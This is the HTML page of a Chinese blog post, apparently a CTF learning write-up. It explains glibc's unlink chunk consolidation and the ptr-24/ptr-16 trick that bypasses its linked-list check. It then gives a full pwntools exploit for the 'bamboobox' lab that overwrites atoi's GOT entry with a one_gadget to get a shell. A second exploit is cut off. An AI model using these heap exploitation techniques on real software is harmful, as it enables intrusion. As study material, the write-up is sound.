
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>unlink初探 - V1ct0r的博客</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="一、源码介绍：当需要合并相邻的freechunk时用到unlink：前言：P的选取一定是你要unlink合并后的P的地址，不是随便选取的~1、向后合并：


12345678910111213141,"> 
    <meta name="author" content="V1ct0r"> 
    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">

    
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">

    
<link rel="stylesheet" href="/css/obsidian.css">

    
<link rel="stylesheet" href="/css/ball-atom.min.css">

<meta name="generator" content="Hexo 4.2.1"></head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">V1ct0r的博客</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">unlink初探</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg) ">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/PWN"><b>「
                    </b>PWN<b> 」</b></a>
                
                January 03, 2020
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/unlink%E5%88%9D%E6%8E%A2/" title="unlink初探" class="">unlink初探</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    217k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    3:17
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E5%90%84%E7%A7%8D%E6%8A%80%E5%B7%A7/" rel="tag">各种技巧</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h3 id="一、源码介绍："><a href="#一、源码介绍：" class="headerlink" title="一、源码介绍："></a>一、源码介绍：</h3><h4 id="当需要合并相邻的freechunk时用到unlink："><a href="#当需要合并相邻的freechunk时用到unlink：" class="headerlink" title="当需要合并相邻的freechunk时用到unlink："></a>当需要合并相邻的freechunk时用到unlink：</h4><h4 id="前言：P的选取一定是你要unlink合并后的P的地址，不是随便选取的"><a href="#前言：P的选取一定是你要unlink合并后的P的地址，不是随便选取的" class="headerlink" title="前言：P的选取一定是你要unlink合并后的P的地址，不是随便选取的~"></a>前言：P的选取一定是你要unlink合并后的P的地址，不是随便选取的~</h4><p>1、向后合并：</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line">    <span class="comment">/*malloc.c  int_free函数中*/</span></span><br><span class="line"><span class="comment">/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/</span></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line"><span class="built_in">size</span> += prevsize;</span><br><span class="line"><span class="comment">//修改指向当前chunk的指针，指向前一个chunk。</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); </span><br><span class="line">      unlink(p, bck, fwd);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//相关函数说明：</span></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                                   \</span><br><span class="line">    BK = P-&gt;bk;                                   \</span><br><span class="line">    FD-&gt;bk = BK;                                  \</span><br><span class="line">    BK-&gt;fd = FD;                                  \</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>画个图举例说明：</p>
<p><img src="/blog_img/1563366311730.png" alt="1563366311730"></p>
<p>当chunk2free完了，发现上一个块chunk1也是free状态的，就抱大腿合并起来，指挥权交给chunk1，指向chunk2的ptr指针现在指向chunk1，size也变为size+presize：也就是这样：</p>
<p><img src="/blog_img/1563366382842.png" alt="1563366382842"></p>
<p>接着因为使用完了会进行分箱式管理，因此这个新的free的chunk1不会很快回到操作系统，于是需要从所在的free的chunk链中进行unlink（有fd指针和bk指针）再放到unsorted bin中保存。</p>
<p>2、向前合并（）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line">……</span><br><span class="line"><span class="comment">/*这里p指向当前chunk*/</span></span><br><span class="line">nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">……</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//判断nextchunk是否为free chunk</span></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//next chunk为free chunk</span></span><br><span class="line">            unlink(nextchunk, bck, fwd); <span class="comment">//将nextchunk从链表中移除</span></span><br><span class="line">          <span class="built_in">size</span> += nextsize; <span class="comment">// p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！</span></span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);    </span><br><span class="line"></span><br><span class="line">      ……</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>同样用图来解释：</p>
<p><img src="/blog_img/1563366870254.png" alt="1563366870254"></p>
<p>当chunk1free完了，发现相邻的chunk2也是free的，会先进行unlink(让chunk2先脱链，有fd和bk指针)，然后再进行合并：size = size+nextsize，ptr指向不变，还是自己：</p>
<p><img src="/blog_img/1563367038719.png" alt="1563367038719"></p>
<p>以上就是两种合并free的chunk的方式，合并过程中用到unlink函数，在free的链表中把chunk块脱下来，然后可以把新的free的chunk块放到bins中管理~</p>
<h3 id="二、保护机制探索"><a href="#二、保护机制探索" class="headerlink" title="二、保护机制探索"></a>二、保护机制探索</h3><p>目前集成的对于unlink的保护机制主要就是下面这个：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>这个保护学过了数据结构都懂得，也就是要满足p–&gt;fd–&gt;bk = p–&gt;bk–&gt;fd = p，很好理解，但是要怎么绕过呢？</p>
<p>这里看了大佬的方法，只能说一声：牛逼！</p>
<p>利用一个很巧妙的数学等式，完美搞定：下面的例子演示的是64位的例子（一个字节8位），取一个全局变量ptr（指针地址，一般为chunk块的指针地址，存放于bss段中）</p>
<p>令p–&gt;fd = ptr - 24，p–&gt;bk = ptr - 16 ，为什么这么构造，待会就知道了，我们知道空闲块的布局是这样的：</p>
<p><img src="/blog_img/1563368383146.png" alt="1563368383146"></p>
<p>当我们构造好了后，得到FD = p–&gt;fd = ptr - 24，BK =  p–&gt;bk = ptr - 16，那么FD–&gt;bk = FD + 3*8 = ptr - 24 + 24 = ptr，同理可得BK–&gt;fd = BK + 16 =  ptr - 16 + 16 = ptr,也就是说FD–&gt;bk = BK–&gt;fd = ptr，从而成功绕过了检测机制，那么unlink执行了~我们知道执行是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;                                   \</span><br><span class="line">BK = P-&gt;bk;                                   \</span><br><span class="line">FD-&gt;bk = BK;                                  \</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<p>根据上面的精心构造，我们可以得到FD–&gt;bk = BK 相当于ptr = ptr - 16，BK-&gt;fd = FD相当于 ptr = ptr - 24，unlink执行完了后，我们得到最终的结果就是ptr = ptr -24 ，也就是说ptr指向了ptr-24的地址处。那么如果我们往ptr写入内容为‘a’*24+free(got)，那么就可以实现在ptr处写入free的got表，如果再往ptr写入onegadget，那么就是我往free的got表写入onegadget从而getshell~</p>
<p>纸上学终觉浅，绝知此事要躬行：上题目</p>
<h3 id="LAB11-bamboobox"><a href="#LAB11-bamboobox" class="headerlink" title="LAB11:bamboobox"></a>LAB11:bamboobox</h3><p><img src="/blog_img/1563370619963.png" alt="1563370619963"></p>
<p>开了堆栈不可执行和栈溢出保护，问题不大：</p>
<p>ida分析一波</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v3 = hello_message;</span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  (*v3)(<span class="number">16L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        (v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild choice!!!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>熟悉的菜单题：把功能都看一遍</p>
<p><img src="/blog_img/1563370724557.png" alt="1563370724557"></p>
<p><img src="/blog_img/1563543894651.png" alt="1563370761098"></p>
<p><img src="/blog_img/1563370816735.png" alt="1563370816735"></p>
<p><img src="/blog_img/1563370872813.png" alt="1563370872813">接着我们把函数提取出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the name of item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sd(str(index))</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the new name of the item:"</span>)</span><br><span class="line">    sd(content)</span><br></pre></td></tr></table></figure>

<p>认真分析会发现chunk块的结构如下:</p>
<p>struct chunk{</p>
<p>  int  size；</p>
<p>  char  a[size];</p>
<p>}</p>
<p>进一步分析可以知道，存在堆溢出的漏洞，造成堆块的重叠，这里就是说change时会把新的内容输进去，从而覆盖原来的内容达到溢出的目的，但是一开始题目会生成一个chunk（0x10），我们知道这是用于输出最开始和结束的字符串，有地址，程序有magic地址：</p>
<p><img src="/blog_img/1563371239086.png" alt="1563371239086"></p>
<p>这题的思路就是unlink，因为有堆溢出的漏洞，所以可以改写相邻的chunk的状态，使得它在free时会触发unlink，实现我们的攻击目的：</p>
<p>利用思路：在chunk1中构造fake_chunk，然后溢出改chunk2的presize和size，这样就可以free掉chunk1了，同时可以触发unlink，使得我们的ptr指针指向ptr-3的位置，输入时输入‘a’*24+atoi_got，就可以实现ptr指向got表，接着可打印出真实地址，又可以改写got为onagadget。</p>
<p>上exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the name of item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sd(str(index))</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the new name of the item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bk(0x0000000000400ADD)</span></span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">FD = <span class="number">0x6020c8</span> - <span class="number">3</span>*<span class="number">8</span></span><br><span class="line">BK = FD + <span class="number">8</span></span><br><span class="line">py1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(FD) + p64(BK)  <span class="comment">#0x20</span></span><br><span class="line">py1 += <span class="string">"a"</span>*<span class="number">0x60</span> </span><br><span class="line">py1 += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) <span class="comment">#0x10</span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x90</span>,py1)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">py2 = <span class="string">''</span></span><br><span class="line">py2 += <span class="string">'a'</span>*<span class="number">24</span> + p64(atoi_got)</span><br><span class="line">change(<span class="number">0</span>,len(py2),py2) </span><br><span class="line">puts()</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi_addr---&gt;"</span> + hex(atoi_addr)</span><br><span class="line">onegadget = atoi_addr - libc.symbols[<span class="string">"atoi"</span>] + <span class="number">0xf02a4</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"onegadget---&gt;"</span> + hex(onegadget)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x10</span>,p64(onegadget))</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下面进入gdb动态调试一波，看下具体是怎么实现的：</p>
<p>首先是malloc两个0x80大小的块（实际会是0x90，超过了fastbin的范围），就可以实现unlink，双向链表才有这个操作，fastbin单向链表所以是没有的unlink的攻击的。</p>
<p><img src="/blog_img/1563372107661.png" alt="1563372107661"></p>
<p>可以看到3个chunk，1号chunk是存字符串的，2和3号chunk是我们申请的chunk块。</p>
<p>接着我们构造出fake_chunk:</p>
<p><img src="/blog_img/1563372228995.png" alt="1563372228995"></p>
<p>在free掉chunk3前，我们先看看我们的ptr = 0x6020c8在内存中的布局：</p>
<p><img src="/blog_img/1563372600721.png" alt="1563372600721"></p>
<p>看到它指向的正是0xf4d030，也就是我们的chunk2的string的堆块地址，接着我们free掉chunk3，可以得到：</p>
<p><img src="/blog_img/1563372803882.png" alt="1563372803882"></p>
<p>ptr指向我们的ptr-24的位置（0x6020b0），接着看下我们的堆块</p>
<p><img src="/blog_img/1563372928474.png" alt="1563372928474"></p>
<p>可以看到由于只有一个free块又与topchunk相邻，所以会和topchunk结合。大小变成0x20fd1，如果申请了3个chunk就会放到unsorted bin 中。</p>
<p>接着我们改写0x6020c8的位置为atoi的got表：</p>
<p><img src="/blog_img/1563373643006.png" alt="1563373643006"></p>
<p>这里前面有3个位置直接填充字符，看到0x6020c8的位置被我们成功写成了atoi的got表，接着再写一次就是往got写onegadget了：</p>
<p><img src="/blog_img/1563373999722.png" alt="1563373999722"></p>
<p>可以看到成功写入了onegadget，当再次选择时，调用atoi函数就是调用了onegadget，那么就可以gethell了~</p>
<p><img src="/blog_img/1563371890289.png" alt="1563371890289"></p>
<p>这题如果不用unlink去做，就是用house of force，也就是一开始我想的，怎么修改程序自己生成的那个chunk，因为里面有地址，想要修改地址里面的内容为我们的magic，这样就可以实现catflag了，直接上exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 